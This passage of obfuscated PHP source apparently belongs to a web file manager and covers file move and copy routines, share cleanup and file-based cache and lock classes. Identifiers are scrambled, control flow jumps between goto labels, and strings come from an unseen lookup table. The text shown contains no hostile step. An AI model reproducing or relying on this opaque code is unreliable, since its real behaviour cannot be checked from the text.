$F„Œ¢¥£î§[$bˆ­³ª°Ÿ[558]]) { $this->removeNow($e‡šë«‹œİ, !1); } goto a‰÷§Œ‹…; Cİ†ó²¨¨: if ($eĞØ‡²…âè[$bˆ­³ª°Ÿ[487]] == $a¾ÂÑÅ¢¬Š && $b¸÷ìÇ±Ä‘ != $eĞØ‡²…âè[$bˆ­³ª°Ÿ[28]]) { $B¿®´¶¦õ¯ = $this->fileNameExist($a¾ÂÑÅ¢¬Š, $b¸÷ìÇ±Ä‘); if ($B¿®´¶¦õ¯ && $eĞØ‡²…âè[$bˆ­³ª°Ÿ[395]] == $bˆ­³ª°Ÿ[494]) { goto a¶‘ôÏÀ; eÙØÃŒŸ¹¸: return $B¿®´¶¦õ¯; goto CœÈöÜÇ; a¶‘ôÏÀ: $bÌŸ‰–Û®— = $this->sourceInfo($B¿®´¶¦õ¯); $E¼ìÕƒË’ = $this->fileHistory($bÌŸ‰–Û®—, $eĞØ‡²…âè[$bˆ­³ª°Ÿ[444]], $eĞØ‡²…âè[$bˆ­³ª°Ÿ[87]]); if (!$E¼ìÕƒË’) { Model($bˆ­³ª°Ÿ[447])->remove($eĞØ‡²…âè[$bˆ­³ª°Ÿ[444]]); } goto D†Ë¿ùÁ×; D†Ë¿ùÁ×: $this->removeNow($e‡šë«‹œİ, !1); $this->folderSizeReset($a¾ÂÑÅ¢¬Š); Hook::trigger($bˆ­³ª°Ÿ[557], $E‰—Õ­Ş±ç); goto eÙØÃŒŸ¹¸; CœÈöÜÇ: } } $aíºË±Šå = $b¸÷ìÇ±Ä‘ ? $b¸÷ìÇ±Ä‘ : $eĞØ‡²…âè[$bˆ­³ª°Ÿ[28]]; $this->lockMoveStart($e‡šë«‹œİ); goto e›¨÷•Û—¯; FÛ¨šˆ‚£Ó: return $e·§Æµ’Í; goto E—ÚîÍêæ¹; Eµº‰«‹Ã: $this->folderSizeReset($a¾ÂÑÅ¢¬Š); $bÏ·Š«’äâ = array($eĞØ‡²…âè[$bˆ­³ª°Ÿ[487]], $a¾ÂÑÅ¢¬Š); if ($eĞØ‡²…âè[$bˆ­³ª°Ÿ[395]] == $bˆ­³ª°Ÿ[93]) { $bÏ·Š«’äâ[] = $e‡šë«‹œİ; } goto C®¦â¾î; B„ƒßñ„ùô: if ($eĞØ‡²…âè[$bˆ­³ª°Ÿ[487]] == $dãİÔİªÄé[$bˆ­³ª°Ÿ[394]]) { if ($eĞØ‡²…âè[$bˆ­³ª°Ÿ[422]] == $bˆ­³ª°Ÿ[93]) { Model($bˆ­³ª°Ÿ[420])->restore(array($e‡šë«‹œİ)); } if (!$b¸÷ìÇ±Ä‘ || $b¸÷ìÇ±Ä‘ == $eĞØ‡²…âè[$bˆ­³ª°Ÿ[28]]) { return $e‡šë«‹œİ; } } $E‰—Õ­Ş±ç = $this->pathInfoMore($e‡šë«‹œİ); if ($this->isParentOf($e‡šë«‹œİ, $a¾ÂÑÅ¢¬Š)) { return !1; } goto FŒ¸²‘áÈÒ; E—ÚîÍêæ¹: } private function _move($cÆ¼Ç”âŠˆ, $e·ãÂ¼†÷ç, $eˆìëæ‰™…, &$eë‰±æÖùÍ, $fÅ«Ê£›ªİ = '') { goto E¸÷ğ¯Ş‹; f­­ğÆ¸Ş: $this->lockWriteStart($e·ãÂ¼†÷ç, $f×ø»ùŞâ­); if (!$bòöŒÌ¨¢) { return $this->_moveForce($cÆ¼Ç”âŠˆ, $e·ãÂ¼†÷ç, $f×ø»ùŞâ­); } $BÉØ‹Æ¯ = $bòöŒÌ¨¢; goto bÆ¾Ï£„; F½­ÛÅ‘Í: $f×ø»ùŞâ­ = $fÅ«Ê£›ªİ ? $fÅ«Ê£›ªİ : $DçÚó£Ä¦¦[$D¡­ê„ïé“[28]]; $bòöŒÌ¨¢ = $this->fileNameExistCache($e·ãÂ¼†÷ç, $f×ø»ùŞâ­); $this->lockMoveStart($cÆ¼Ç”âŠˆ); goto f­­ğÆ¸Ş; E¸÷ğ¯Ş‹: $D¡­ê„ïé“ =& $_SERVER[¢Í]; $DçÚó£Ä¦¦ = $this->sourceInfo($cÆ¼Ç”âŠˆ); $aÏàÊ˜ì¢ = $DçÚó£Ä¦¦[$D¡­ê„ïé“[395]] == $D¡­ê„ïé“[93]; goto F½­ÛÅ‘Í; EĞŒÎİì£: return $BÉØ‹Æ¯; goto dµŠíŸŠ; bÆ¾Ï£„: $f‘·¿Ç¡¿á = !1; if ($aÏàÊ˜ì¢) { if ($eˆìëæ‰™… == REPEAT_RENAME_FOLDER) { $f×ø»ùŞâ­ = $this->fileNameAuto($e·ãÂ¼†÷ç, $f×ø»ùŞâ­, $eˆìëæ‰™…, $aÏàÊ˜ì¢); $BÉØ‹Æ¯ = $this->_moveForce($cÆ¼Ç”âŠˆ, $e·ãÂ¼†÷ç, $f×ø»ùŞâ­); } else { if ($eˆìëæ‰™… == REPEAT_RENAME_FOLDER) { $eˆìëæ‰™… = REPEAT_RENAME; } $FÊÌ¿¤Õò‰ = $this->_childrenListSelect($cÆ¼Ç”âŠˆ); foreach ($FÊÌ¿¤Õò‰ as $AÓ›ÀºµÌ) { $this->_move($AÓ›ÀºµÌ[$D¡­ê„ïé“[394]], $bòöŒÌ¨¢, $eˆìëæ‰™…, $eë‰±æÖùÍ); } $f‘·¿Ç¡¿á = !0; } } else { if ($eˆìëæ‰™… == REPEAT_SKIP) { $f‘·¿Ç¡¿á = !0; } else { if ($eˆìëæ‰™… == REPEAT_RENAME || $eˆìëæ‰™… == REPEAT_RENAME_FOLDER) { $f×ø»ùŞâ­ = $this->fileNameAuto($e·ãÂ¼†÷ç, $f×ø»ùŞâ­, $eˆìëæ‰™…, $aÏàÊ˜ì¢); $BÉØ‹Æ¯ = $this->_moveForce($cÆ¼Ç”âŠˆ, $e·ãÂ¼†÷ç, $f×ø»ùŞâ­); } else { if ($eˆìëæ‰™… == REPEAT_REPLACE) { $F‰¬çâ™È¡ = $this->sourceInfoCache($bòöŒÌ¨¢); $e²‚Ûæ– = $this->fileHistory($F‰¬çâ™È¡, $DçÚó£Ä¦¦[$D¡­ê„ïé“[444]], $DçÚó£Ä¦¦[$D¡­ê„ïé“[87]]); if ($e²‚Ûæ–) { $eë‰±æÖùÍ[$D¡­ê„ïé“[527]][] = $DçÚó£Ä¦¦[$D¡­ê„ïé“[444]]; } else { $f‘·¿Ç¡¿á = !0; } } } } } if ($f‘·¿Ç¡¿á && !$eë‰±æÖùÍ[$D¡­ê„ïé“[558]]) { $eë‰±æÖùÍ[$D¡­ê„ïé“[558]] = !0; } goto EĞŒÎİì£; dµŠíŸŠ: } private function _moveForce($C´·ìí˜ÙÖ, $FÊ™ÎœíîÌ, $fÓ¦¢áÓ’) { goto DŸìƒÙŠñô; cÂ“ÁÍàªõ: if ($AĞ…è„†º¡) { $E»¹¦®”¸ = array($fˆÌë„ó–[551] => array($fˆÌë„ó–[509], $b±÷º½…´Ò[$fˆÌë„ó–[485]] . $b±÷º½…´Ò[$fˆÌë„ó–[394]] . $fˆÌë„ó–[510])); $A³ß½ÅêÆ¢ = $b±÷º½…´Ò[$fˆÌë„ó–[485]] . $b±÷º½…´Ò[$fˆÌë„ó–[394]] . $fˆÌë„ó–[47]; $F¹ºØˆÍ–Ú = $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[485]] . $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[394]] . $fˆÌë„ó–[47] . $b±÷º½…´Ò[$fˆÌë„ó–[394]] . $fˆÌë„ó–[47]; $e¡¹ÛÛº» = array($fˆÌë„ó–[551] => array($fˆÌë„ó–[559], "\x72\x65\x70\x6c\x61\143\x65\50\160\141\x72\x65\x6e\164\114\145\166\x65\154\x2c\47{$A³ß½ÅêÆ¢}\47\54\x27{$F¹ºØˆÍ–Ú}\47\x29"), $fˆÌë„ó–[547] => $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[396]], $fˆÌë„ó–[548] => $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[482]]); if ($A¹Ùøªî) { $e¡¹ÛÛº»[$fˆÌë„ó–[421]] = 0; } $this->where($E»¹¦®”¸)->data($e¡¹ÛÛº»)->save(); } $this->where(array($fˆÌë„ó–[408] => $C´·ìí˜ÙÖ))->data($bà¾ÆÄŸë°)->save(); return $C´·ìí˜ÙÖ; goto d“ñ½·—Ù; AÍ½ÛÖ»¹²: $AĞ…è„†º¡ = $b±÷º½…´Ò[$fˆÌë„ó–[395]] == $fˆÌë„ó–[93]; $bà¾ÆÄŸë° = array($fˆÌë„ó–[393] => $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[394]], $fˆÌë„ó–[551] => $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[485]] . $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[394]] . $fˆÌë„ó–[47], $fˆÌë„ó–[547] => $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[396]], $fˆÌë„ó–[548] => $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[482]], $fˆÌë„ó–[550] => USER_ID, $fˆÌë„ó–[411] => $fÓ¦¢áÓ’); $CØ±¶«±âÕ = $b±÷º½…´Ò[$fˆÌë„ó–[396]] == SourceModel::TYPE_GROUP && $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[396]] == SourceModel::TYPE_GROUP && $b±÷º½…´Ò[$fˆÌë„ó–[482]] == $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[482]]; goto aµù¡ŞØ–Ÿ; aµù¡ŞØ–Ÿ: if (!$CØ±¶«±âÕ) { Model($fˆÌë„ó–[480])->authClear($C´·ìí˜ÙÖ); } $A¹Ùøªî = $b±÷º½…´Ò[$fˆÌë„ó–[422]] == $fˆÌë„ó–[93] && $A¾øŞÀ»ĞÛ[$fˆÌë„ó–[422]] != $fˆÌë„ó–[93]; if ($A¹Ùøªî) { $bà¾ÆÄŸë°[$fˆÌë„ó–[421]] = 0; } goto cÂ“ÁÍàªõ; DŸìƒÙŠñô: $fˆÌë„ó– =& $_SERVER[¢Í]; $b±÷º½…´Ò = $this->sourceInfo($C´·ìí˜ÙÖ); $A¾øŞÀ»ĞÛ = $this->sourceInfo($FÊ™ÎœíîÌ); goto AÍ½ÛÖ»¹²; d“ñ½·—Ù: } private function clearShare($FÈƒ Ğê°, $a¬âÒ¨–’) { goto e¯Šº¥êñ; e˜ÄÚÅ¤®‡: Model($Fß¬¢´ÅÑ[561])->where($cÜ­äŞ®Í)->save(array($Fß¬¢´ÅÑ[472] => 0)); Model($Fß¬¢´ÅÑ[562])->where($cÜ­äŞ®Í)->delete(); goto e÷É÷‚¡İ«; e¯Šº¥êñ: $Fß¬¢´ÅÑ =& $_SERVER[¢Í]; $b—¤ØÍÉêÑ = $this->sourceInfo($FÈƒ Ğê°); $A‡ùæîæ×ƒ = $this->sourceInfo($a¬âÒ¨–’); goto BñÕØ–Ùî·; EÑ¢æœö„ß: if (!$bîƒ¬·Æ›’) { return; } $cÜ­äŞ®Í = array($Fß¬¢´ÅÑ[394] => array($Fß¬¢´ÅÑ[7], $bîƒ¬·Æ›’), $Fß¬¢´ÅÑ[472] => 1); $cÔ‘ÍÀ½é = Model($Fß¬¢´ÅÑ[561])->field($Fß¬¢´ÅÑ[465])->where($cÜ­äŞ®Í)->select(); goto fÈÛ•Ò‡–Ê; fÈÛ•Ò‡–Ê: if (!$cÔ‘ÍÀ½é) { return; } $cÔ‘ÍÀ½é = array_to_keyvalue($cÔ‘ÍÀ½é, $Fß¬¢´ÅÑ[33], $Fß¬¢´ÅÑ[465]); $cÜ­äŞ®Í = array($Fß¬¢´ÅÑ[465] => array($Fß¬¢´ÅÑ[7], $cÔ‘ÍÀ½é)); goto e˜ÄÚÅ¤®‡; BñÕØ–Ùî·: if ($b—¤ØÍÉêÑ[$Fß¬¢´ÅÑ[482]] == $A‡ùæîæ×ƒ[$Fß¬¢´ÅÑ[482]] && $b—¤ØÍÉêÑ[$Fß¬¢´ÅÑ[396]] == $Fß¬¢´ÅÑ[560]) { return; } $cÜ­äŞ®Í = array($Fß¬¢´ÅÑ[485] => array($Fß¬¢´ÅÑ[509], $b—¤ØÍÉêÑ[$Fß¬¢´ÅÑ[485]] . $FÈƒ Ğê° . $Fß¬¢´ÅÑ[510])); $bîƒ¬·Æ›’ = $this->field($Fß¬¢´ÅÑ[408])->where($cÜ­äŞ®Í)->getField($Fß¬¢´ÅÑ[394], !0); goto EÑ¢æœö„ß; e÷É÷‚¡İ«: } public function copyFolderFromIO($D›±İµ¼½, $eĞÁÒØ‚ìƒ, $Bœ–Æ½Ô, $a‡ª»ÄÂ«ˆ, $dÌö¢•ŠªÆ, $E²ñ´¿ïá¿ = false) { goto FŞë±Å¯áĞ; D®„÷¶’»˜: Model($e¶øÄâÃŒØ[447])->linkAdd($c©´øÄ…Ìö[$e¶øÄâÃŒØ[527]]); Model($e¶øÄâÃŒØ[447])->remove($c©´øÄ…Ìö[$e¶øÄâÃŒØ[563]]); $this->folderSizeReset($Bœ–Æ½Ô); goto EâğåÆò; FŞë±Å¯áĞ: $e¶øÄâÃŒØ =& $_SERVER[¢Í]; $c©´øÄ…Ìö = array($e¶øÄâÃŒØ[528] => array(), $e¶øÄâÃŒØ[529] => array(), $e¶øÄâÃŒØ[527] => array(), $e¶øÄâÃŒØ[563] => array()); $fĞ¼ö‚ÏŠ‚ = $E²ñ´¿ïá¿ ? $E²ñ´¿ïá¿ : $D›±İµ¼½->pathThis($eĞÁÒØ‚ìƒ); goto aƒğ…éò’ï; A²ÖãÈ¨Ú: Model($e¶øÄâÃŒØ[530])->addAll($c©´øÄ…Ìö[$e¶øÄâÃŒØ[528]], array(), !0); Model($e¶øÄâÃŒØ[531])->eventCopy($e…µ–ÜÌ‡¤); $this->saveAll($c©´øÄ…Ìö[$e¶øÄâÃŒØ[529]]); goto D®„÷¶’»˜; Dì‘ÅÕ˜À: Hook::trigger($e¶øÄâÃŒØ[565]); if ($e…µ–ÜÌ‡¤) { $this->folderSizeResetChildren($e…µ–ÜÌ‡¤); } $this->_childrenListClear(); goto A²ÖãÈ¨Ú; eß·Åªî÷: if ($DŞÀˆ£Õªø) { $this->_childrenAllMake($DŞÀˆ£Õªø); } Hook::trigger($e¶øÄâÃŒØ[564]); $this->_copyChildTo($D›±İµ¼½, $eĞÁÒØ‚ìƒ, $e…µ–ÜÌ‡¤, $a‡ª»ÄÂ«ˆ, $c©´øÄ…Ìö, $dÌö¢•ŠªÆ); goto Dì‘ÅÕ˜À; aƒğ…éò’ï: $DŞÀˆ£Õªø = $this->fileNameExist($Bœ–Æ½Ô, $fĞ¼ö‚ÏŠ‚); $e…µ–ÜÌ‡¤ = $this->mkdir($Bœ–Æ½Ô, $fĞ¼ö‚ÏŠ‚, $a‡ª»ÄÂ«ˆ); if (!$DŞÀˆ£Õªø || $a‡ª»ÄÂ«ˆ == REPEAT_RENAME_FOLDER) { $a‡ª»ÄÂ«ˆ = !1; } goto eß·Åªî÷; EâğåÆò: $this->updateModifyTime($Bœ–Æ½Ô); return $e…µ–ÜÌ‡¤; goto EŸ…‘ñ˜Ôó; EŸ…‘ñ˜Ôó: } private function _copyChildTo($fë¸™•…Ğó, $A·ÓÀ—óæŠ, $E­àĞ ¶Ç, $c‡ç‡Í¥Ø„, &$A›ßÅ³¼õÄ, $D«è…§¡µ÷) { goto bˆÃæÑÆ‘; bˆÃæÑÆ‘: $DÅÖŸ‹õ·ô =& $_SERVER[¢Í]; $fÈ‰È†—Ÿ‚ = $this->sourceInfoCache($E­àĞ ¶Ç); $E•…«Ó¦¨ = $fë¸™•…Ğó->listPath($A·ÓÀ—óæŠ); goto béßåÊö¸È; C÷Âˆœ’ì: $dÓ„ï»–Ìš = $this->_childrenList($E­àĞ ¶Ç); $dÓ„ï»–Ìš = array_to_keyvalue($dÓ„ï»–Ìš, $DÅÖŸ‹õ·ô[28]); foreach ($c˜‘à¨† as $FˆæŞÎ—‹¨) { $FŒÆÙµÖê = $dÓ„ï»–Ìš[$FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]]]; $C‹­İ¢—Ê™ = $FŒÆÙµÖê[$DÅÖŸ‹õ·ô[394]]; $this->_copyApplyMeta($FŒÆÙµÖê, $A›ßÅ³¼õÄ); if ($FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[29]] == $DÅÖŸ‹õ·ô[86]) { $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[85]] = $fë¸™•…Ğó->getPathInner($FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[85]]); $this->_copyChildTo($fë¸™•…Ğó, $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[85]], $C‹­İ¢—Ê™, $c‡ç‡Í¥Ø„, $A›ßÅ³¼õÄ, $D«è…§¡µ÷); } } goto f»¡Ñ±®; cÊ‹Ëà¼ë: foreach ($c˜‘à¨† as &$FˆæŞÎ—‹¨) { goto F¶İİà²¹; eğÍİİÒ¨: $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[87]] = _get($FˆæŞÎ—‹¨, $DÅÖŸ‹õ·ô[87], 0); $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]] = _get($FˆæŞÎ—‹¨, $DÅÖŸ‹õ·ô[444], 0); if (!isset($FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[566]]) && $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]]) { $A›ßÅ³¼õÄ[$DÅÖŸ‹õ·ô[563]][] = $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]]; } goto b²òŞÍê‘; b²òŞÍê‘: if ($c‡ç‡Í¥Ø„) { $DÊŞ’ƒäİĞ = $this->fileNameExistCache($E­àĞ ¶Ç, $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]]); if ($DÊŞ’ƒäİĞ) { if ($FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[395]] || $c‡ç‡Í¥Ø„ == REPEAT_SKIP) { continue; } if ($c‡ç‡Í¥Ø„ == REPEAT_REPLACE) { $FŒÆÙµÖê = $this->sourceInfoCache($DÊŞ’ƒäİĞ); $A„µ˜ÕÇ¡Ø = $this->fileHistory($FŒÆÙµÖê, $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]], $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[87]]); if ($A„µ˜ÕÇ¡Ø) { $A›ßÅ³¼õÄ[$DÅÖŸ‹õ·ô[527]][] = $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]]; } continue; } else { if ($c‡ç‡Í¥Ø„ == REPEAT_RENAME) { $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]] = $this->fileNameAutoCache($E­àĞ ¶Ç, $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]], $c‡ç‡Í¥Ø„, !1); } } } } if (!$FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[395]] && $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]]) { $A›ßÅ³¼õÄ[$DÅÖŸ‹õ·ô[527]][] = $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[444]]; } $bøÊ÷ä¶ö[] = $this->_makeItemData($FˆæŞÎ—‹¨, $fÈ‰È†—Ÿ‚, $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]]); goto eêâ„ç¦òÆ; F¶İİà²¹: if (isset($aã×±•Ş•¨[$FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]]])) { $FˆæŞÎ—‹¨ = $aã×±•Ş•¨[$FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[28]]]; } $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[395]] = $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[29]] == $DÅÖŸ‹õ·ô[86]; $FˆæŞÎ—‹¨[$DÅÖŸ‹õ·ô[397]] = _get($FˆæŞÎ—‹¨, $DÅÖŸ‹õ·ô[175], $DÅÖŸ‹õ·ô[33]); goto eğÍİİÒ¨; eêâ„ç¦òÆ: } unset($FˆæŞÎ—‹¨); if (!empty($bøÊ÷ä¶ö)) { $this->addAll($bøÊ÷ä¶ö); $this->_childrenListSelect($E­àĞ ¶Ç); } goto C÷Âˆœ’ì; béßåÊö¸È: $c˜‘à¨† = array_merge($E•…«Ó¦¨[$DÅÖŸ‹õ·ô[83]], $E•…«Ó¦¨[$DÅÖŸ‹õ·ô[84]]); $aã×±•Ş•¨ = $this->_addFiles($fë¸™•…Ğó, $E•…«Ó¦¨[$DÅÖŸ‹õ·ô[83]], $D«è…§¡µ÷); $bøÊ÷ä¶ö = array(); goto cÊ‹Ëà¼ë; f»¡Ñ±®: } private function _addFiles($C†¸¿áŒĞ¨, $CÍòÌÁ¢ñ, $FÇØŸƒºÖ—) { goto bÓŞÕÑãËİ; A¾—Ú‹©Ì: foreach ($e¿Ì¤ñˆê— as $DßÓ«Ú…ÃÂ) { if (!isset($Dã’²¶Õù[$DßÓ«Ú…ÃÂ[$FÕš¦±­[177]]])) { continue; } $f·´Èàó³¡ = $Dã’²¶Õù[$DßÓ«Ú…ÃÂ[$FÕš¦±­[177]]]; foreach ($f·´Èàó³¡ as &$A½—ÖÕÖ¸Û) { $A½—ÖÕÖ¸Û[$FÕš¦±­[444]] = $DßÓ«Ú…ÃÂ[$FÕš¦±­[444]]; $A½—ÖÕÖ¸Û[$FÕš¦±­[566]] = !0; } unset($A½—ÖÕÖ¸Û); } $F—çèƒÅƒ‘ = array(); foreach ($CÍòÌÁ¢ñ as $cŠÎ•óÙ–) { if (isset($cŠÎ•óÙ–[$FÕš¦±­[566]]) && $cŠÎ•óÙ–[$FÕš¦±­[566]]) { continue; } $A•Å‹Ñßœ¬ = $C†¸¿áŒĞ¨->getPathInner($cŠÎ•óÙ–[$FÕš¦±­[85]]); $d³„œåöà– = $dø÷†¹œÚ->addFileMake($A•Å‹Ñßœ¬, $cŠÎ•óÙ–[$FÕš¦±­[87]], $cŠÎ•óÙ–[$FÕš¦±­[178]], $cŠÎ•óÙ–[$FÕš¦±­[177]], $cŠÎ•óÙ–[$FÕš¦±­[28]], $FÇØŸƒºÖ—); $F—çèƒÅƒ‘[] = $d³„œåöà–; } goto e¯—ğò‡ñõ; A«İ¤Ä„Õ: foreach ($CÍòÌÁ¢ñ as &$A½—ÖÕÖ¸Û) { goto C¿®æÊ½; báŠçè‘É: $aÜ«Í›î»§ = $C†¸¿áŒĞ¨->hashMd5($A½—ÖÕÖ¸Û[$FÕš¦±­[85]]); if (strlen($aÜ«Í›î»§) > 10 && !isset($Dã’²¶Õù[$aÜ«Í›î»§])) { $Dã’²¶Õù[$aÜ«Í›î»§] = array(); } $A½—ÖÕÖ¸Û[$FÕš¦±­[178]] = $BÊÎ‰ÂïºÏ; goto dÁèì˜ŒÏê; C¿®æÊ½: Hook::trigger($FÕš¦±­[567], $A½—ÖÕÖ¸Û); $A½—ÖÕÖ¸Û[$FÕš¦±­[85]] = $C†¸¿áŒĞ¨->getPathInner($A½—ÖÕÖ¸Û[$FÕš¦±­[85]]); $BÊÎ‰ÂïºÏ = $C†¸¿áŒĞ¨->hashSimple($A½—ÖÕÖ¸Û[$FÕš¦±­[85]]); goto báŠçè‘É; eÙ·’–ˆŠ“: if (count($Dã’²¶Õù[$aÜ«Í›î»§]) > 1) { $A½—ÖÕÖ¸Û[$FÕš¦±­[566]] = !0; } goto f‘çËøöŸè; dÁèì˜ŒÏê: $A½—ÖÕÖ¸Û[$FÕš¦±­[177]] = $aÜ«Í›î»§; Hook::trigger($FÕš¦±­[568], $A½—ÖÕÖ¸Û); $Dã’²¶Õù[$aÜ«Í›î»§][] =& $A½—ÖÕÖ¸Û; goto eÙ·’–ˆŠ“; f‘çËøöŸè: } unset($A½—ÖÕÖ¸Û); $cÚîÜòùœ‹ = array($FÕš¦±­[177] => array($FÕš¦±­[7], array_keys($Dã’²¶Õù))); goto e¬ åŞçòñ; aËÁ¹ÇÁ—Ù: $e¿Ì¤ñˆê— = $e¿Ì¤ñˆê— ? $e¿Ì¤ñˆê— : array(); foreach ($e¿Ì¤ñˆê— as $DßÓ«Ú…ÃÂ) { if (!isset($Dã’²¶Õù[$DßÓ«Ú…ÃÂ[$FÕš¦±­[177]]])) { continue; } $cŒª»ŠÏ =& $Dã’²¶Õù[$DßÓ«Ú…ÃÂ[$FÕš¦±­[177]]]; foreach ($cŒª»ŠÏ as &$A½—ÖÕÖ¸Û) { $A½—ÖÕÖ¸Û[$FÕš¦±­[444]] = $DßÓ«Ú…ÃÂ[$FÕš¦±­[444]]; } unset($A½—ÖÕÖ¸Û); } $BÏå’‚ÅĞ = array(); goto cª“Ü¡·µ; e¯—ğò‡ñõ: $dø÷†¹œÚ->addAll($F—çèƒÅƒ‘); $cÚîÜòùœ‹ = array($FÕš¦±­[177] => array($FÕš¦±­[7], array_keys($Dã’²¶Õù))); $e¿Ì¤ñˆê— = $dø÷†¹œÚ->where($cÚîÜòùœ‹)->select(); goto aËÁ¹ÇÁ—Ù; bÓŞÕÑãËİ: $FÕš¦±­ =& $_SERVER[¢Í]; if (!$CÍòÌÁ¢ñ || count($CÍòÌÁ¢ñ) == 0) { return array(); } $Dã’²¶Õù = array(); goto A«İ¤Ä„Õ; e¬ åŞçòñ: $dø÷†¹œÚ = Model($FÕš¦±­[569]); $e¿Ì¤ñˆê— = $dø÷†¹œÚ->where($cÚîÜòùœ‹)->select(); $e¿Ì¤ñˆê— = $e¿Ì¤ñˆê— ? $e¿Ì¤ñˆê— : array(); goto A¾—Ú‹©Ì; cª“Ü¡·µ: foreach ($CÍòÌÁ¢ñ as $d¤Âªìí‡«) { $BÏå’‚ÅĞ[$d¤Âªìí‡«[$FÕš¦±­[28]]] = $d¤Âªìí‡«; } return $BÏå’‚ÅĞ; goto E›‰¹¢³Ùµ; E›‰¹¢³Ùµ: } } goto FŠ‘Ù¤‘½; e‰ë¶ğ·’£: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($a¹ô›Ëò«Œ, $d…ç½ãËˆ‹) { $e…ŒÍ¯™Ã§ =& $_SERVER[¢Í]; $this->cachePath = $a¹ô›Ëò«Œ[$e…ŒÍ¯™Ã§[85]]; $this->prefix = $e…ŒÍ¯™Ã§[774]; $this->cacheTime = $d…ç½ãËˆ‹; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($e’Ñ“†¡µ) { $aÍÀÈ‹Áİˆ =& $_SERVER[¢Í]; $e’Ñ“†¡µ = str_replace(array($aÍÀÈ‹Áİˆ[775], $aÍÀÈ‹Áİˆ[103], $aÍÀÈ‹Áİˆ[79]), $aÍÀÈ‹Áİˆ[776], $e’Ñ“†¡µ); return $this->cachePath . $aÍÀÈ‹Áİˆ[777] . $e’Ñ“†¡µ . $aÍÀÈ‹Áİˆ[778]; } public function set($B¤œğÙñÚÍ, $a Ç©„µ‡÷, $fŒÎÉ‰áºÅ = false) { $d…œÊæ¢í = $this->getFile($B¤œğÙñÚÍ); if (file_put_contents($d…œÊæ¢í, $this->prefix . $a Ç©„µ‡÷, LOCK_EX)) { return !0; } @unlink($d…œÊæ¢í); return !1; } public function get($dˆÎÑŞÓÍ) { $A·Ğ‹¥ÒØ¿ = $this->getFile($dˆÎÑŞÓÍ); if (file_exists($A·Ğ‹¥ÒØ¿) && filemtime($A·Ğ‹¥ÒØ¿) < time() - $this->cacheTime) { @unlink($A·Ğ‹¥ÒØ¿); return !1; } $cñ®ÎÏ‹Ë¡ = @file_get_contents($A·Ğ‹¥ÒØ¿); return substr($cñ®ÎÏ‹Ë¡, strlen($this->prefix)); } public function remove($B†¹‚² á ) { $e›÷ãîğ·® = $this->getFile($B†¹‚² á ); return @unlink($e›÷ãîğ·®); } public function deleteAll() { $b×§‡ÈŒÖ– =& $_SERVER[¢Í]; $A´™ŸÜ¡šê = scandir($this->cachePath); foreach ($A´™ŸÜ¡šê as $A‚±µÕ‡ŠË) { $a©ÆŞ¶Œ = $this->cachePath . $A‚±µÕ‡ŠË; if (strpos($a©ÆŞ¶Œ, $b×§‡ÈŒÖ–[778]) && strpos($a©ÆŞ¶Œ, $b×§‡ÈŒÖ–[779])) { @unlink($a©ÆŞ¶Œ); } } } public function clearTimeout() { $B¯ŒĞ•âê½ =& $_SERVER[¢Í]; $c¨Åî˜Îƒæ = scandir($this->cachePath); foreach ($c¨Åî˜Îƒæ as $B¸ºÌ¯É‡Ñ) { $Dò¥ç¼è„Ÿ = $this->cachePath . $B¸ºÌ¯É‡Ñ; if (strpos($Dò¥ç¼è„Ÿ, $B¯ŒĞ•âê½[778]) && strpos($Dò¥ç¼è„Ÿ, $B¯ŒĞ•âê½[779]) && filemtime($Dò¥ç¼è„Ÿ) < time() - $this->cacheTime) { @unlink($Dò¥ç¼è„Ÿ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto d¢½à¤¨®; d¢½à¤¨®: $dŠìêÀ¿Çñ =& $_SERVER[¢Í]; if (self::$handle) { return self::$handle; } $D™©à¤İï = $GLOBALS[$dŠìêÀ¿Çñ[6]][$dŠìêÀ¿Çñ[352]]; goto A¸‡•§Ñ‹ ; A¸‡•§Ñ‹ : self::$timeout = $D™©à¤İï[$dŠìêÀ¿Çñ[780]] ? $D™©à¤İï[$dŠìêÀ¿Çñ[780]] : 10; $bëè÷µ ù = _get($GLOBALS[$dŠìêÀ¿Çñ[6]], $dŠìêÀ¿Çñ[781]); $AÒäÜŒñù‰ = $D™©à¤İï[$dŠìêÀ¿Çñ[767]] ? $D™©à¤İï[$dŠìêÀ¿Çñ[767]] : 